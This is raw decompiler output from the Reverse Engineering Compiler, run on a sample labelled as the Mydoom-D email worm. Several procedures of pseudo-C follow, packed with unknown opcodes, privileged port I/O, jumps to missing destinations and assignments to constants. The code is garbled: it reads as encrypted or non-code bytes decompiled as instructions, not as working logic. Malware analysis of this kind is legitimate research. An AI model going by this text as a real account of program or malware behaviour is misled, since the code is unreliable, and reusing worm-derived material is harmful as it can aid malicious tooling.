/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6a (C) Giampiero Caprino (Dec  8 2002)
 *	Input file: 'Email-Worm.Win32.Mydoom-d.unp'
 */

/* DEST BLOCK NOT FOUND: 004a19d1 -> 23da65e6 */
/* DEST BLOCK NOT FOUND: 004a1b40 -> 6e9f37ca */
stack space not deallocated on return
/*	Procedure: 0x004A1807 - 0x004A1B34
 *	Argument size: -2072
 *	Local size: 0
 *	Save regs size: 0
 */

L004A1807()
{



    004a180c: eax = L0000707a(-2081100060);
    004a1813: (restore)ds;
    004a1814: asm("%c clc");
    004a1816: asm("xchg dh,[ecx+0xfbcc164c]");
    004a181c: *LA0ED2274 = al;
    004a1821: asm("Unknown opcode 0x62");
    004a1822: asm("enter 0x7697,0x20");
    004a1826: asm("sahf");
    004a1827: 1257440446 = esp * edx;
    004a182d: asm("fdivr qword [edx+0x800a8825]");
    004a1833: asm("Unknown opcode 0x0f");
    004a1834: asm("sahf");
    004a1835: *(esi + 1546042401) = *(esi + 1546042401) | dl;
    004a183b: goto L004a184f;
    004a183d: *edx & dh;
    004a183f: (restore)ebp;
    004a1841: bl = bl ^ *(eax - 121);
    004a1844: asm("%e jo 0x4a17f5");
004a1847: L004a1847:
    004a1847: (fsave) *(esi + ecx * 2);
    004a184a: asm("xchg eax,esp");
    004a184b: asm("jecxz 0x4a1887");
    004a184d: asm("insb");
004a184f: L004a184f:
    004a184f: asm("xchg eax,ebp");
    004a1850: asm("clc");
    004a1851: asm("ficom dword [eax]");
    004a1853: if(!(edx = edx - 1)) {
        004a1855: (restore)eax;
        004a1856: asm("cmpsb");
        004a1857: asm("xchg eax,ecx");
        004a1858: asm("in al,dx");
        004a1859: asm("imul ah");
        004a185b: asm("fcmovnb st2");
        004a185d: asm("aam 0xc2");
        004a185f: asm("int 0xc0");
        004a1861: return;
        004a1864: asm("xchg eax,esi");
        004a186c: goto L0000a0ea;
        004a1873: asm("outsd");
        004a1874: asm("%d call 0x87261a30");
        004a187a: if(*(esi + 605975625) < 211) {
            ff100003: goto L004a1847;
        }
        004a187c: dl = 100;
        004a187e: *(ebp + -411528656) = *(ebp + -411528656) >> cl;
        004a1884: esi = esi + 1;
        004a1885: asm("ror byte [esi+0x39],1");
        004a1888: *edi = *esi;
        004a1888: edi = edi + 1;
        004a1888: esi = esi + 1;
        004a1889: asm("%c mov ah,0xc3");
        004a188c: (restore)edx;
        004a188d: asm("int3");
        004a188e: asm("fcmovnu st3");
        004a1890: asm("int 0xfe");
        004a1892: asm("std");
        004a1893: *(edi + 1767854000) = *(edi + 1767854000) + -2082131710;
        004a189d: *edi = *esi;
        004a189d: edi = edi + 1;
        004a189d: esi = esi + 1;
        004a189e: asm("arpl [ebx],sp");
        004a18a0: asm("lds edx,[esi+0x88df0945]");
    }
004a18a4: L004a18a4:
    004a18a6: (save)edi;
    004a18a7: asm("daa");
    004a18a8: asm("loope 0x4a1904");
    004a18aa: asm("sbb ebp,ebp");
004a18ac: L004a18ac:
    004a18ac: (restore)ebx;
    004a18ad: al :: 139;
    004a18af: -82 = ebp * ebx;
    004a18b7: asm("out dx,eax");
    004a18b8: if(eax = eax - 2145392529) {
        ff100005: goto L004a18ac;
    }
    004a18ba: asm("popa");
    004a18bb: asm("cmc");
    004a18bc: asm("adc edx,[ebx+edx+0xf546d5b3]");
    004a18c3: asm("sbb [edi+0xf1b707f8],ebp");
    004a18c9: cl = cl | *(ecx - 3);
    004a18cc: ebp = ebp - *(ebx + edi * 4 - 5);
    004a18d5: *edi = *edi >> 1;
    004a18d7: if(!(eax = eax - -408855266)) {
        004a18d9: *LC4E38591 = al;
        004a18de: return;
        004a18df: return;
        004a18e0: eax = eax & 1059661110;
        004a18e5: *edi = *edi - dh;
        004a18e7: ecx = -1148323334;
        004a18ed: (restore)esp;
        004a18ee: 61 = *ebx * -1148323334;
        004a18f1: asm("into");
004a18f6: L004a18f6:
        004a18f8: (restore)ecx;
        004a18f9: asm("adc al,cl");
        004a18fb: asm("xchg eax,ebp");
        004a18fc: if(esi = ecx + -1881210761) {
            ff100009: goto L004a1932;
        }
        004a18fe: asm("rep push ebx");
        004a1900: eax = eax ^ -1892067866;
        004a1905: asm("sbb bh,ah");
        004a1907: (save)edi;
        004a1908: *(edx + -1945395927) = *(edx + -1945395927) >> 1;
        004a190e: asm("sbb ebx,[ebx+0x303dbe0d]");
004a1914: L004a1914:
        004a1914: eax = eax & -204289243;
        004a1919: goto L004a18a4;
        004a191b: asm("pushf");
        004a191c: eax & -685869247;
        004a1921: *(ebp + -483562168) = !( *(ebp + -483562168));
    }
    004a1927: *edi = al;
    004a1928: asm("jpo 0x4a195d");
    004a192a: asm("loope 0x4a18e0");
    004a192c: asm("adc ecx,ecx");
    004a192e: asm("scasd");
    004a192f: if(edi = edi + 1) {
        ff10000b: goto L004a1914;
    }
    004a1931: edi = 894820365;
004a1932: L004a1932:
    004a1936: asm("wait");
    004a1937: ah = ah + bl;
    004a1939: asm("jpo 0x4a1914");
    004a193b: esp = esp - 1;
    004a193c: asm("fst dword [ecx-0x39]");
    004a1940: *(edi - 27) = -1287807624;
    004a1947: asm("fisubr dword [ebx-0x7d]");
    004a194a: *(ecx + eax * 4 - 39) = *(ecx + eax * 4 - 39) ^ esp;
    004a194e: if(esi = esi - 1) {
        ff10000d: goto L004a18f6;
    }
    004a1950: asm("iret");
    004a1951: asm("pmulhriw mm2,[eax+0xb26b05c5]");
    004a1958: asm("xchg eax,ebx");
    004a1959: asm("retf");
    004a195a: *(ecx + ecx * 2 - 95) = *(ecx + ecx * 2 - 95) - edi;
    004a195e: asm("xchg eax,edi");
    004a195f: asm("Unknown opcode 0xfe");
    004a1960: edi = !edi;
    004a1962: eax = eax ^ 51186984;
    004a1967: bl = bl | *ebx;
    004a1969: asm("adc eax,[ecx]");
    004a196b: asm("adc al,0x31");
    004a196d: edi = edi - ecx;
    004a196f: asm("salc");
    004a1970: *(edi + 360005805)();
    004a1976: esp :: edx;
    004a1978: asm("sbb dword [ebx+0x79],+0x2c");
004a197a: L004a197a:
    004a197c: asm("stc");
    004a197d: cl = 103;
    004a197f: asm("%c out 0xa7,eax");
    004a1987: edx = -1001266421;
    004a198c: eax = *LEF069F39;
    004a1991: asm("outsd");
    004a1992: asm("std");
    004a1993: if(eax = eax + -753025576) {
        ff10000f: goto L004a197a;
    }
    004a1995: edx = *%gs:edx];
    004a1998: cl = cl + *L273C2014;
    004a199e: asm("fsubrp st6");
    004a19a0: asm("out dx,al");
    004a19a1: *(eax + -1036294060) :: 474331898;
    004a19ab: asm("enter 0x5f94,0x6");
    004a19af: asm("into");
    004a19b0: asm("xchg bh,[ecx+0x20]");
    004a19b3: asm("cld");
    004a19b4: eax = eax + 1;
    004a19b5: ecx = ecx ^ *(edx + 79549026);
    004a19bb: asm("lock dec esp");
    004a19bd: asm("xlatb");
    004a19be: esi = esi - 1;
    004a19bf: asm("%s mov esi,0xb824a831");
    004a19c5: esi = esi - *(edx + 217402058);
    004a19cb: asm("cwde");
    004a19ce: *esi = ~( *esi);
    004a19d0: (save)esi;
    004a19d1: goto L23da65e6;
    004a19d6: asm("jpe 0x4a198a");
    004a19d8: asm("loop 0x4a1a07");
    004a19da: if(!(al = al & 79)) {
        004a19dc: asm("pushf");
        004a19dd: asm("Unknown opcode 0xc7");
        004a19de: asm("%d push es");
        004a19e0: esi = esi - 1;
        004a19e1: eax = *LDBC8F498;
        004a19e6: bl = bl & *edx;
        004a19e8: asm("sbb ah,[ebp+0x7c]");
        004a19eb: (save)1852211060;
        004a19f0: asm("sbb [eax],ax");
        004a19f3: asm("sbb al,0x20");
        004a19f5: edx = edx >> cl;
        004a19f7: asm("Unknown opcode 0x82");
        004a19f8: dl = 93;
        004a19fa: asm("adc [%fs:edi+esi*8],ch");
        004a19fe: asm("scasb");
        004a19ff: (save)esi;
        004a1a00: (save)ds;
        004a1a01: asm("ror dword [eax+0xdc924b44],1");
        004a1a07: *edx = *edx - edx;
        004a1a09: eax & 1521620304;
        004a1a0e: *edi = eax;
        004a1a0e: edi = edi + 4;
        004a1a0f: asm("iret");
        004a1a10: ebx = ebx - 1;
        004a1a13: return(82);
        004a1a14: ebx = ebx & *(edx + -1322020588);
    }
    004a1a24: asm("loop 0x4a1a1f");
    004a1a26: asm("aad 0xb0");
    004a1a29: if(!(1848385589 = *(ecx + 942812975) * eax)) {
        004a1a2b: bh = bh + dh;
        004a1a2d: asm("lodsd");
        004a1a2e: asm("xchg eax,ecx");
        004a1a2f: (restore)esp;
        004a1a30: al = al + 203;
        004a1a32: edx = *(esi + 26);
        004a1a35: asm("ror dword [ebp+0x3f87e838],0xda");
        004a1a3c: asm("xchg ah,[0xbfd028c2]");
        004a1a42: asm("das");
        004a1a43: L0000830c();
        004a1a4a: asm("sbb edx,[esi+0x70c5b92a]");
        004a1a50: L6f0cc15c();
    }
    004a1a55: ch = 217;
    004a1a57: asm("%f mov ah,0xfb");
    004a1a5a: (restore)eax;
    004a1a5b: asm("adc cl,[edx+0x876e26fd]");
    004a1a61: asm("retf 0x2b0e");
    004a1a64: *%gs:ebx+0x1209e3dd] = esi;
    004a1a6b: *(edx + 69) = *(edx + 69) | edx;
    004a1a6e: (save)98;
    004a1a70: asm("outsd");
    004a1a71: asm("arpl [esi+eax],ax");
    004a1a74: (restore)ebx;
    004a1a75: edx = edx - 1;
    004a1a76: (restore)eax;
    004a1a77: asm("jpe 0x4a1ae5");
    004a1a79: eax = eax | -324415469;
    004a1a7e: asm("lodsd");
    004a1a7f: eax :: -1816367261;
    004a1a84: *LC8915579 = al;
004a1a88: L004a1a88:
    004a1a89: asm("sbb [ecx-0x16],al");
    004a1a8c: (save)esp;
    004a1a8d: asm("jpe 0x4a1a22");
    004a1a8f: (save)eax;
    004a1a90: asm("popa");
    004a1a91: asm("Unknown opcode 0x82");
    004a1a92: *(esi - 21) :: eax;
    004a1a95: eax = eax | 884813024;
    004a1a9a: ecx = ecx - 1;
    004a1a9b: asm("rcr byte [eax-0x43],0x23");
    004a1aa1: (restore)ebx;
    004a1aa2: asm("insb");
    004a1aa3: if(!(ebp & ebx)) {
        004a1aa5: >= ? L004a1b02 : ;
        004a1aa7: < ? L004a1ae7 : ;
        004a1aab: asm("out 0xd7,al");
        004a1aad: asm("loopne 0x4a1a74");
        004a1aaf: (save)ds;
        004a1ab0: (save)ds;
        004a1ab1: asm("Unknown opcode 0xfe");
        004a1ab5: ebp = ds;
        004a1ab6: asm("std");
        004a1ab7: asm("xchg eax,ebp");
        004a1ab8: asm("aaa");
        004a1ab9: dh = 251;
        004a1abb: (fsave)((frestore)) + *(eax + 123);
        004a1abe: *L0000009F = *L0000009F ^ 251;
        004a1ac1: (restore)ebp;
        004a1ac2: return;
        004a1ac5: if(al = al + 16) {
            ff100017: goto L004a1a88;
        }
        004a1ac7: al = al ^ 57;
        004a1ac9: asm("int1");
        004a1aca: asm("Unknown opcode 0xdd");
        004a1acb: asm("retf 0xdb21");
        004a1ace: (restore)eax;
        004a1acf: (restore)edx;
        004a1ad0: (save)ecx;
        004a1ad1: edx = -1914459952;
        004a1ad6: ebp = ebp - 1;
        004a1ad7: asm("Unknown opcode 0x82");
        004a1ad8: asm("pushf");
        004a1ad9: (restore)es;
        004a1ada: *(edx + ebx + 52) = *(edx + ebx + 52) >> 114;
        004a1adf: asm("imul ch");
        004a1ae1: bh = 19;
        004a1ae3: -1348624279 = *ecx * ecx;
        004a1ae9: asm("stc");
        004a1aea: asm("int 0xc7");
        004a1aec: L00001551();
        004a1af3: asm("loop 0x4a1a85");
        004a1af5: asm("sbb [0x4e021c69],dh");
        004a1b00: if(eax & -1431505023) {
            ff100019: goto L004a1b30;
        }
        004a1b02: asm("retf");
        004a1b03: ebx = ebx - 1;
        004a1b04: asm("xchg eax,ebx");
        004a1b05: (restore)es;
        004a1b06: asm("insb");
        004a1b07: *(esi + -397456292) = *(esi + -397456292) + bl;
        004a1b0d: return;
        004a1b10: asm("sbb ebp,[edx]");
        004a1b12: asm("retf 0xcb77");
        004a1b15: ebx = 975890563;
    }
    004a1b1a: asm("Unknown opcode 0xd9");
    004a1b1b: asm("Unknown opcode 0x8d");
    004a1b1c: asm("cmc");
    004a1b1d: asm("out dx,al");
    004a1b1e: asm("das");
    004a1b1f: (save)esi;
    004a1b20: asm("ror byte [ebp+0x4d],1");
    004a1b23: eax = eax - -409019683;
    004a1b2d: ah = 403217436 - *(esi - 66);
004a1b30: L004a1b30:
    004a1b30: al = *esi;
    004a1b30: esi = esi + 1;
    004a1b32: cl = 213;
    004a1b34: asm("iret");
}

/* DEST BLOCK NOT FOUND: 004a1b40 -> 6e9f37ca */
/*	Procedure: 0x004A1B35 - 0x004A1BAC
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004A1B35()
{



    004a1b35: asm("std");
    004a1b36: esi = esi >> cl;
    004a1b38: ebp = 803482344;
    004a1b3d: asm("loop 0x4a1b66");
    004a1b3f: asm("outsd");
    004a1b40: goto L6e9f37ca;
    004a1b45: (save)esi;
    004a1b46: goto L004a1b95;
    004a1b48: asm("xchg eax,esi");
    004a1b49: eax = eax ^ 422099277;
    004a1b4e: asm("retf");
    004a1b4f: asm("xchg eax,edi");
    004a1b50: *(eax + 9) :: 590317962;
    004a1b57: bl = 70;
    004a1b59: asm("Unknown opcode 0x8f");
    004a1b5a: edi = edi & ecx;
    004a1b5c: ebx = ebx + 1;
    004a1b5d: (save)edx;
    004a1b5e: *(edi + 74022163) = ~( *(edi + 74022163));
    004a1b64: asm("popa");
    004a1b65: asm("cmpsd");
    004a1b66: esi = esi | *esi;
    004a1b68: al = !al;
    004a1b6f: dh = 231;
    004a1b71: eax = L26c1d379() - 1927309416;
    004a1b76: asm("rcr dword [ebx],cl");
    004a1b79: *edx = *edx ^ bh;
    004a1b7b: asm("aam 0x50");
    004a1b7d: asm("rcr ch,cl");
    004a1b7f: cl = 115;
    004a1b81: L4c260d8c();
    004a1b89: *(ebp + -1377591217) :: ~(ebx - 1);
    004a1b8f: asm("out 0x22,eax");
    004a1b91: *L75FB0375 :: esp;
004a1b95: L004a1b95:
    004a1b98: asm("in eax,dx");
    004a1b99: asm("stc");
    004a1b9a: asm("out dx,eax");
    004a1b9b: asm("sbb edx,esi");
    004a1b9d: (save)esp;
    004a1b9e: (save)ds;
    004a1b9f: edx = 1091326848;
    004a1ba4: (restore)esi;
    004a1ba5: asm("scasd");
    004a1ba6: ecx = ecx + 1;
    004a1ba7: eax & 561541960;
    004a1bac: asm("retf");
}

stack space not deallocated on return
/*	Procedure: 0x004A1BAD - 0x004A1CE5
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004A1BAD()
{



    004a1bad: asm("int3");
    004a1bae: (restore)ebx;
    004a1baf: asm("sahf");
    004a1bb0: ecx = ecx | *ecx;
    004a1bb2: asm("sbb eax,0x104a2589");
004a1bb5: L004a1bb5:
    004a1bb7: al = al + 75;
    004a1bb9: (restore)ecx;
    004a1bba: asm("sti");
    004a1bbb: asm("into");
    004a1bbc: asm("adc eax,0xd7464785");
    004a1bc1: asm("adc al,0xd0");
    004a1bc3: (save)ebp;
    004a1bc4: asm("sbb ah,[edi-0xd]");
    004a1bc7: asm("scasd");
    004a1bc8: asm("wait");
    004a1bc9: asm("clc");
    004a1bca: edx = edx + 1;
    004a1bcb: asm("sbb al,0x39");
    004a1bcf: if(!(dl = dl - bl)) {
        004a1bd1: ebx = ebx + 1;
        004a1bd2: *(edi + 419999853) = *(edi + 419999853) + 38;
        004a1bd9: asm("adc dh,[eax-0x39]");
        004a1bdc: asm("aam 0xdd");
        004a1bde: asm("loope 0x4a1b8c");
        004a1be0: asm("cli");
        004a1be1: asm("adc ah,[eax]");
        004a1be3: asm("iret");
        004a1be4: eax = eax + ebx;
004a1be5: L004a1be5:
        004a1be6: esp = ebp;
        004a1be6: (restore)ebp;
        004a1be7: asm("aam 0xb6");
        004a1be9: bh = 84;
    }
    004a1beb: esp = esp + *ecx;
    004a1bed: esp = -301810204;
    004a1bf2: asm("in al,dx");
    004a1bf3: asm("jpo 0x4a1bc5");
    004a1bf5: *(eax + edx * 8) = edx;
    004a1bf8: (save)es;
    004a1bf9: asm("o16 hlt");
    004a1bfb: asm("retf");
004a1bfc: L004a1bfc:
    004a1bfc: edi = 122420451;
    004a1c01: asm("pushf");
    004a1c02: al = *L45E1F4A5;
    004a1c07: *(esi + esi * 2) = *(esi + esi * 2) - dl;
    004a1c0a: asm("sbb ebp,[esi-0x5a]");
    004a1c13: if(240709083 = *edx * eax) {
        ff10001d: goto L004a1be5;
    }
    004a1c1a: bh = bh | dl;
    004a1c1c: *(edi + -123504433) :: al;
    004a1c28: esi = 1981401497;
    004a1c2d: if(eax = *L55BD652E & *(ebx + 1504067044)) {
        ff10001f: goto L004a1bb5;
    }
    004a1c2f: *(ecx - 9) = *(ecx - 9) ^ ah;
    004a1c34: ch = 198;
    004a1c36: asm("adc dh,[esi+0xb3266604]");
    004a1c3c: if(!(ebp = ebp & 1981401497)) {
004a1c3e: L004a1c3e:
        004a1c40: if(al & 248) {
            ff100023: goto L004a1bfc;
        }
        004a1c42: dl = 212;
        004a1c44: goto L00000310;
        004a1c4b: asm("aam 0x69");
        004a1c4d: dl = 75;
        004a1c4f: asm("fsubr qword [ecx]");
        004a1c51: bh = cl;
        004a1c53: asm("cmc");
        004a1c54: asm("Unknown opcode 0x82");
        004a1c55: asm("cdq");
        004a1c56: ch = 0;
        004a1c59: if(eax = eax + 1) {
            ff100025: goto L004a1c8d;
        }
    }
    004a1c5b: al = al - 167;
    004a1c5d: asm("aas");
    004a1c5e: *LFD2A5252 = al;
    004a1c63: asm("repne xor [ebp+0xa4bb7b93],bl");
    004a1c6a: asm("Unknown opcode 0xd0");
    004a1c6b: asm("aaa");
    004a1c6c: asm("popf");
    004a1c6d: asm("sbb [ebp+0x3542cd9f],ah");
    004a1c73: *edi = al;
    004a1c74: asm("sbb al,0x29");
    004a1c76: asm("adc ah,0xf1");
    004a1c79: if(edi = edi + 1) {
        ff100027: goto L004a1c3e;
    }
    004a1c7b: 1351801243 = edx * esi;
    004a1c81: goto L0000267d;
    004a1c88: (save)-345725559;
004a1c8d: L004a1c8d:
    004a1c8d: *ebx = *ebx + ah;
    004a1c8f: asm("scasd");
    004a1c90: asm("pushf");
    004a1c91: asm("fcmovnu st3");
    004a1c93: asm("insb");
    004a1c94: asm("rcl ebx,0x4");
    004a1c97: asm("%s cmp eax,0xd12955f4");
004a1c9c: L004a1c9c:
    004a1c9d: cl = 242;
    004a1c9f: esp = esp - 1;
    004a1ca0: esp = esp - 1;
    004a1ca1: *(ebp - 11) = *(ebp - 11) ^ dh;
    004a1ca4: asm("xchg eax,esp");
    004a1ca5: asm("aad 0xe6");
    004a1ca7: asm("out dx,eax");
    004a1cac: *(esp + ecx) = es;
    004a1caf: asm("xchg eax,ebp");
    004a1cb0: *eax = *eax ^ esi;
    004a1cb2: asm("a16 xor eax,0xd881ef01");
    004a1cb8: if(eax = eax + *(ebx + edx * 2 - 100)) {
        ff100029: goto L004a1c9c;
    }
    004a1cba: *edi = eax;
    004a1cba: edi = edi + 4;
    004a1cbb: ebp = ebp - 1;
    004a1cbc: asm("adc ah,[esi]");
    004a1cbe: ah & dh;
    004a1cc0: asm("aad 0x5e");
    004a1cc2: eax = eax | *(esi + -232746022);
    004a1cc8: asm("sbb [ebx+0x3939b3e8],al");
    004a1cce: (save)es;
    004a1ccf: asm("rcl dword [ebp+0x759e47f2],1");
    004a1cd5: *L031881E5 = *L031881E5 >> 1;
    004a1cdb: *edi = al;
    004a1cdc: *(eax + -1897554911) = *(eax + -1897554911) ^ ch;
    004a1ce2: edi = edi + 1 - 1;
    004a1ce3: dh = 42;
}

/* DEST BLOCK NOT FOUND: 004a1f00 -> f5ec6891 */
/*	Procedure: 0x004A1CE6 - 0x004A202F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004A1CE6()
{



    004a1ce6: *(ebp - 22) = *(ebp - 22) << 241;
    004a1cea: (save)esp;
    004a1ceb: ch = 188;
    004a1ced: asm("Unknown opcode 0xc6");
    004a1cee: ah = 97;
    004a1cf0: bh = bh | *(esi + 1694519560);
    004a1cf6: asm("int1");
    004a1cf7: dl = 16;
    004a1cf9: asm("a16 cld");
    004a1cfb: asm("Unknown opcode 0xc7");
    004a1cfc: asm("cwde");
    004a1cfd: -1236303011 = *(ebx + 82) * ecx;
    004a1d09: eax = *L3172178D ^ -36055206;
    004a1d0e: asm("xchg eax,edi");
    004a1d0f: edi = *(ebp - 5);
    004a1d12: asm("cmpsd");
    004a1d13: esi = -951732776;
    004a1d18: ebx = ebx - 1;
    004a1d19: asm("Unknown opcode 0xc7");
    004a1d1a: *L46726AF8 = eax;
    004a1d1f: eax = eax ^ 1114687423;
    004a1d24: asm("lock pop ebp");
    004a1d26: asm("lodsd");
    004a1d27: ch = ch + dl;
    004a1d29: (save)edi;
    004a1d2a: asm("hlt");
    004a1d2b: asm("%g dec eax");
    004a1d2d: asm("out 0x99,al");
    004a1d2f: al = al + 114;
    004a1d31: al = 222;
    004a1d33: bl = 188;
    004a1d35: asm("xchg eax,edx");
    004a1d36: al = al - 1;
    004a1d39: asm("xlatb");
    004a1d3a: asm("arpl si,bp");
    004a1d3c: asm("jecxz 0x4a1d32");
    004a1d3e: asm("Unknown opcode 0x8c");
    004a1d3f: if(!(edx = edx - 1)) {
        004a1d41: asm("int1");
        004a1d42: asm("out 0x30,eax");
        004a1d44: asm("lahf");
        004a1d45: dh = dh + dl;
        004a1d47: asm("wait");
        004a1d48: edi = edi - 1;
        004a1d49: (restore)ecx;
        004a1d4a: ch = 231;
        004a1d4c: asm("das");
        004a1d4d: *(ecx + 84) = *(ecx + 84) & ebp;
        004a1d50: (save)ebp;
        004a1d51: *L0D62B6C8 = al;
        004a1d56: (save)esp;
        004a1d57: ebp = -1010030203;
        004a1d5c: *ecx = *ecx | -1010030203;
        004a1d5e: esi :: ecx;
        004a1d60: ch = 70;
        004a1d62: asm("xchg eax,edi");
        004a1d63: asm("in eax,0x4");
        004a1d65: asm("scasd");
        004a1d66: asm("xchg eax,edx");
        004a1d67: asm("%c jpo 0x4a1de5");
        004a1d6a: al = *L00004C8B;
        004a1d6e: asm("std");
        004a1d6f: asm("xchg eax,ebx");
        004a1d70: (save)esi;
        004a1d71: eax = eax ^ -41517639;
        004a1d76: asm("%f jnz 0x4a1d50");
        004a1d79: asm("adc eax,0xc36e9354");
        004a1d7e: asm("adc cl,ah");
        004a1d80: al = 232;
        004a1d82: (save)esi;
        004a1d83: asm("cmpsb");
        004a1d84: (save)edi;
        004a1d85: eax = eax - 1;
        004a1d86: asm("xchg eax,ecx");
        004a1d87: (save)-47;
        004a1d8b: (restore)ebx;
        004a1d8c: esi = esi - 1;
        004a1d8d: esp = esp + 1;
        004a1d8e: ah = 124;
        004a1d90: *(ebx + -438304902) & 236;
        004a1d96: asm("in eax,dx");
        004a1d97: asm("jpo 0x4a1dfc");
        004a1d99: ecx = ecx - 1;
        004a1d9a: (restore)edx;
        004a1d9b: fs = *(edx + 1477765228);
        004a1da1: ebx = ebx | eax;
        004a1da3: al = *L470DE0F2;
        004a1da8: asm("fidivr dword [esi+0x526ef6b2]");
        004a1dae: al = al + 148;
    }
    004a1db0: asm("cwde");
    004a1db1: (save)ebp;
    004a1db2: asm("sbb ch,[ebx]");
    004a1db4: asm("repne dec edx");
    004a1db6: edi = 775841974;
    004a1dbd: if(!(dx = dx + 1)) {
        004a1dbf: al = al + 225;
        004a1dc1: asm("adc al,0x1d");
        004a1dc3: al = al + 8;
        004a1dc5: edi :: edx;
        004a1dc7: asm("sbb [eax],ch");
        004a1dca: ds = eax;
        004a1dcb: asm("clc");
        004a1dcc: asm("aam 0x5");
        004a1dce: al = al - 254;
        004a1dd0: asm("sbb [%es:esi],ecx");
        004a1dd3: 100 = *(ebp + -1631732344) * ebp;
        004a1dda: asm("outsb");
        004a1ddb: asm("Unknown opcode 0xc5");
        004a1ddc: asm("cld");
        004a1ddd: *edi = *esi;
        004a1ddd: edi = edi + 4;
        004a1ddd: esi = esi + 4;
        004a1dde: asm("Unknown opcode 0xc1");
        004a1ddf: asm("cmc");
        004a1de0: es = ecx;
        004a1de2: asm("sbb dh,[ebx+0x100f0015]");
        004a1de8: eax = eax ^ -1364721497;
        004a1ded: asm("xchg dl,[ebx]");
        004a1def: asm("scasd");
        004a1df0: *ecx & bl;
        004a1df2: asm("scasb");
        004a1df3: eax = eax ^ -1292306024;
    }
    004a1df8: asm("loopne 0x4a1dae");
    004a1dfa: (restore)esi;
    004a1dfb: asm("in eax,0xcd");
    004a1dfd: asm("xchg eax,ebp");
    004a1dfe: (save)ecx;
    004a1dff: goto Le3d48f62;
    004a1e04: *edi = *esi;
    004a1e04: edi = edi + 4;
    004a1e04: esi = esi + 4;
    004a1e05: asm("lock mov ebp,[ebx]");
004a1e06: L004a1e06:
    004a1e08: *(ebp + 2063489082) & dl;
    004a1e0e: *L383C995C = eax;
    004a1e13: asm("%c imul esp,esp,+0x69");
    004a1e18: *(ebp + -2053254213) = *(ebp + -2053254213) - bh;
    004a1e21: asm("loope 0x4a1e31");
    004a1e23: (save)ebx;
    004a1e24: if(46 = ecx * esp) {
        ff10002f: goto L004a1e06;
    }
    004a1e26: asm("Unknown opcode 0x8f");
    004a1e27: (restore)ebx;
    004a1e28: asm("hlt");
    004a1e29: ebx = 64453859;
    004a1e35: asm("adc eax,0xfde16077");
    004a1e3a: asm("cli");
    004a1e3b: asm("popa");
    004a1e3c: asm("in al,dx");
    004a1e3d: if(!( *L3D12BC68 = *L3D12BC68 & dh)) {
        004a1e3f: *(ebx - 123) = *(ebx - 123) - 392850524;
        004a1e46: asm("fnstsw [0x20562dbd]");
        004a1e4c: asm("Unknown opcode 0xf6");
        004a1e4d: ebx = ebx - 1;
        004a1e4e: (fsave)((frestore)) / st1;
        004a1e50: asm("%g aaa");
        004a1e52: *esi = *esi ^ ch;
        004a1e54: asm("Unknown opcode 0x8e");
        004a1e55: asm("lock imul ebx,edi,-0x5a");
        004a1e59: asm("xchg eax,ebp");
        004a1e5a: asm("aam 0x16");
        004a1e5c: *(edx + 99) = *(edx + 99) - edi;
        004a1e5f: ecx = 1841766233;
        004a1e64: edi = -1852004432;
        004a1e69: asm("mul dword [edx]");
        004a1e6b: ebx = ebx - 1;
        004a1e6c: edi = edi | 51;
        004a1e6f: asm("aaa");
        004a1e70: asm("int 0x46");
        004a1e72: eax = eax ^ -1369253161;
        004a1e77: asm("out dx,al");
        004a1e78: (save)esi;
        004a1e79: edx = -1354860108;
        004a1e7e: asm("outsb");
        004a1e7f: *%ss:0xba778814] = eax;
        004a1e85: asm("adc eax,0x933a5043");
        004a1e8a: asm("out 0x7e,eax");
        004a1e8c: (restore)ds;
        004a1e8d: asm("pusha");
        004a1e8e: asm("Unknown opcode 0xc6");
        004a1e8f: asm("das");
        004a1e90: edx & esp;
        004a1e92: asm("sbb eax,0x3916ae36");
        004a1e97: *(esi + -1372242517) = *(esi + -1372242517) << 136;
        004a1e9e: asm("loop 0x4a1e44");
        004a1ea0: eax = eax & 1735546960;
        004a1ea5: (save)505542870;
        004a1eaa: bh = bh - cl;
        004a1eac: (save)-813376986;
    }
    004a1eb1: asm("a16 push ebx");
    004a1eb3: (restore)esp;
    004a1eb4: esp = esp - 1;
    004a1eb5: edi = edi + 1;
    004a1eb6: dh = al;
    004a1eb8: ecx = ecx - 1;
    004a1eb9: asm("%c inc ecx");
    004a1ebb: asm("outsb");
    004a1ebc: eax = *LF885C732;
004a1ec0: L004a1ec0:
    004a1ec1: eax = eax | 1453333910;
    004a1ec6: asm("out dx,eax");
    004a1ec7: asm("adc [edi+0x73890202],cl");
    004a1ecd: asm("rep xchg eax,esi");
    004a1ecf: asm("scasd");
    004a1ed0: *(edi + -752256106) = *(edi + -752256106) >> 220;
    004a1ed7: (restore)ebx;
    004a1ed8: al = al ^ 17;
    004a1eda: asm("sahf");
    004a1edb: asm("aaa");
    004a1edc: ebx = -260902709;
    004a1ee3: *(ah + cl - 123) = *(ah + cl - 123) ^ ch;
    004a1ee6: asm("xchg bl,[ebx-0x74]");
    004a1eee: al = 1404246975;
    004a1ef0: (save)esp;
    004a1ef1: asm("fbld tword [esi-0x15]");
    004a1ef5: asm("adc edx,[edi+0xc5b0211e]");
    004a1efb: asm("cmpsd");
    004a1efc: asm("adc [eax+0x75],edi");
    004a1eff: asm("xchg eax,esp");
    004a1f00: goto Lf5ec6891;
    004a1f05: esp = esp + 1;
    004a1f06: *(esi - 74) :: esi;
    004a1f09: asm("bound ecx,[eax+0x50]");
    004a1f0c: *(ebp + -1881354491) = *(ebp + -1881354491) / *(ebp + -1881354491);
    004a1f0c: edx = *(ebp + -1881354491) % *(ebp + -1881354491);
    004a1f12: esi = -1181022423;
    004a1f17: edi = edi << 1;
    004a1f19: (save)ebp;
    004a1f1a: bl = bl | *(ebp + -784908330);
    004a1f20: asm("aam 0xd9");
    004a1f22: asm("%f sub al,0x8e");
    004a1f25: asm("das");
    004a1f26: ecx = ecx - 1;
    004a1f33: asm("jecxz 0x4a1f7e");
    004a1f35: if(*(1331926485 + edi * 2 + 113899941) = *(1331926485 + edi * 2 + 113899941) - ebp) {
        ff100033: goto L004a1ec0;
    }
    004a1f37: asm("insb");
    004a1f38: (fsave)((frestore)) + *(ebp + -919143000);
    004a1f3e: < ? L004a1f5d : ;
    004a1f40: asm("adc al,0x56");
    004a1f42: asm("%f jo 0x4a1f5a");
    004a1f45: esi = esi - 1;
    004a1f46: (save)ebx;
    004a1f47: (save)esi;
